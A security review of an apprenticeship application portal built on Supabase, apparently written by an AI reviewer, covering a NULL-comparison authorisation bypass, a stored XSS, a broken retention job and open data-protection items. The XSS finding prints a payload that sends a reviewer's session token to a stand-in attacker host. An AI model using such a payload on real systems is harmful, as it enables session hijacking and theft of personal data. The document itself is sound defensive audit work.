# Security review — ACTOM Apprenticeship Application Portal

**Date:** 15 August 2026
**Scope:** Applicant portal, reviewer console, Supabase schema, RLS, storage, retention
**Method:** Source review, automated schema audit, adversarial testing as the real
`anon` and `authenticated` roles, DOM-level injection testing
**Reviewed by:** Claude, at the request of Group IT

---

## Summary

Two exploitable vulnerabilities were found and fixed, both of a kind that automated
scanners and the existing 300-check test suite had missed because the tests asserted the
wrong things. Three lower-severity items and four pre-existing gaps remain open.

| | Finding | Severity | Status |
|---|---|---|---|
| **F1** | Authorisation bypass via NULL role comparison | **High** | Fixed — migration 008 |
| **F2** | Stored XSS in the reviewer console via applicant fields | **High** | Fixed — `kv()` rewritten |
| **F3** | Retention job deleted nothing (found earlier this session) | **High** | Fixed — migration 006 |
| **F4** | Uploaded documents are never malware scanned | Medium | **Open** |
| **F5** | No bot protection on the OTP endpoint | Medium | **Open** |
| **F6** | Storage purge queue has no worker | Medium | **Open** |
| **F7** | Cross-border transfer not covered by consent wording | Medium | **Open** |
| **F8** | Test suites could pass on zero-row operations | Low | Fixed |

---

## F1 — Authorisation bypass via NULL role comparison

**Severity: High.** A signed-in applicant could reach manager-only functions.

Seven functions guarded themselves like this:

```sql
if app.reviewer_role() not in ('admin','manager') then
  raise exception 'Not authorised.';
end if;
```

`app.reviewer_role()` returns NULL for anyone who is not an active reviewer — every
applicant, and every staff member not yet activated. In SQL:

```
NULL not in ('admin','manager')  ->  NULL
```

and `if NULL then ... end if` **does not fire**. The check was skipped for precisely the
people it was written to stop.

Affected: `publish_intake`, `close_intake`, `clone_intake`, `save_trade_subjects`,
`enrol_applicant`, `update_apprentice`, `unenrol_apprentice`, `mark_storage_purged`.

Demonstrated: an applicant account successfully called `publish_intake`, which would let
an outsider freeze an intake's configuration permanently — the lock is deliberately
irreversible. Several other functions failed afterwards for unrelated reasons (a lookup
returning no rows, a missing argument). That is luck, not access control.

**Fix.** A single helper that raises, used at every call site, with NULL handled once:

```sql
if coalesce(v_role, '') <> all (p_roles) then
  raise exception 'Not authorised...' using errcode = 'insufficient_privilege';
end if;
```

RLS policies using the same pattern were safe — a NULL policy result denies access — but
were rewritten via `app.has_role()` so nobody copies the wrong form into a context where
the default is permissive.

**Verification:** `db/test/91-adversarial.sql`, which attempts each function as a real
applicant and as a trade-scoped reviewer. Every attempt now reports BLOCKED.

---

## F2 — Stored XSS in the reviewer console

**Severity: High.** Applicant-controlled script executing in an authenticated reviewer's
session.

The console's key/value helper decided whether a value was markup by *sniffing its
content*:

```js
var isHtml = str.indexOf('<') === 0 || /<button|<span/.test(str);
```

Applicant-supplied fields flow through it — address, accommodation notes, guardian name,
contact number. An applicant typing this into their address field:

```
<img src=x onerror="fetch('//attacker/?t='+localStorage.getItem('sb-...'))">
```

got it rendered as live DOM in the console of any reviewer who opened their application.
The reviewer's session holds a Supabase JWT with reviewer privileges, including the ability
to unlock ID numbers.

**Why it mattered more than usual.** The payload arrives through the public form from an
unauthenticated stranger, is stored, and fires later in a privileged context. No
interaction beyond opening the application is required.

**Fix.** `kv()` now escapes by default; markup must be opted into explicitly with a third
argument, and only for strings the console builds itself. Never infer intent from the
content of untrusted data.

**Verification:** `test-xss.js` injects five payloads through the database and asserts they
render as inert text. The test first confirms the payload actually reaches the screen —
without that check it would have passed on an empty page and proved nothing.

---

## F3 — Retention job deleted nothing

Covered in migration 006. Supabase blocks direct `DELETE` on `storage.objects`; the nightly
job attempted it, raised, and rolled back — so no expired application was ever deleted.
Silent, with no error surfaced anywhere a person would see. A POPIA s14 failure.

Fixed by queueing file deletions for a worker with the Storage API. **See F6: the worker
does not exist yet.**

---

## Open items

### F4 — Uploaded documents are never scanned
`scan_status` exists on every document and defaults to `pending`. Nothing sets it. Reviewers
open files uploaded by anonymous members of the public. Until a scanner is wired in, ensure
documents are only opened on managed endpoints with Cynet active. A Storage webhook to an
Edge Function is the intended path.

### F5 — No bot protection on the OTP endpoint
Sign-in relies on Supabase's rate limits alone. Turnstile in front of `signInWithOtp`
requires an Edge Function to verify the token. Without it the endpoint can be used to send
mail to arbitrary addresses at ACTOM's expense and reputation.

### F6 — Storage purge queue has no worker
Migration 006 queues file deletions correctly, but nothing drains the queue. Application
rows are deleted on schedule; the files remain in the bucket. That is not what "deleted
after 12 months" means to an applicant or to the Information Regulator. Monitor with
`select * from public.v_storage_purge_status;` — if `pending` only grows, this is why.

### F7 — Cross-border transfer not in the consent wording
Supabase has no South African region, so applicant data sits offshore. That is a s72
transfer. The consent wording does not mention it. This cannot be retrofitted after
applications arrive without re-consenting everyone.

---

## What held up

Worth recording, because it is the part that does not need attention:

- **RLS** on all 19 public tables, every one with a policy. An applicant reading another
  applicant's record, documents, guardian details, register entry or the audit log: all
  returned zero rows.
- **Encrypted ID numbers** unreachable from any browser role — not revoked but never
  granted, which is the only form that holds. Confirmed by column-privilege query.
- **The reveal path** is the sole route to a plaintext ID, demands a reason of at least
  five characters, and writes an audit row before returning.
- **Trade scoping** held: a reviewer restricted to one trade could not see or reveal
  anything outside it.
- **Privilege escalation** attempts all failed — self-granting a reviewer profile,
  self-activating, calling `app_private` helpers, reading the Vault, deleting audit rows.
- **SQL injection** through RPC arguments: parameterised throughout, nothing reachable.
- **No secrets in the repository**; the pre-commit hook decodes JWTs and checks the role
  claim, so a service_role key is caught even with no giveaway text around it.

---

## Recommendations, in order

1. **Apply migration 008 before the next intake opens.** F1 is exploitable today.
2. **Deploy the storage purge worker** (F6). Retention is not actually happening without it.
3. **Wire malware scanning** (F4) before the portal takes public traffic.
4. **Get the Information Officer's decision on F7** — it is the only item that cannot be
   fixed later.
5. **Add Turnstile** (F5).
6. **Run `db/security-audit.sql` against production** and act on anything that reports FAIL
   or WARN. Re-run before each intake.
7. **Commission an independent penetration test** before go-live, per HQ–ISC–001. This
   review was conducted by the same party that wrote the code, which is a real limitation —
   I found my own bugs, but I am not the right person to be the only one looking.

---

## A note on the testing

Three of the findings existed *behind passing tests*. The pattern is worth carrying into
future ACTOM work:

- A lock test that runs `UPDATE ... ` and asserts "no exception" passes identically whether
  the update was refused or simply matched zero rows. Count affected rows.
- An injection test that asserts on an empty page passes trivially. Assert the payload
  arrived before asserting it was neutralised.
- A local PostgreSQL harness that lacks Supabase's own protections will not reproduce
  Supabase's failures. The shim now includes the storage deletion guard, which is what
  surfaced F3.
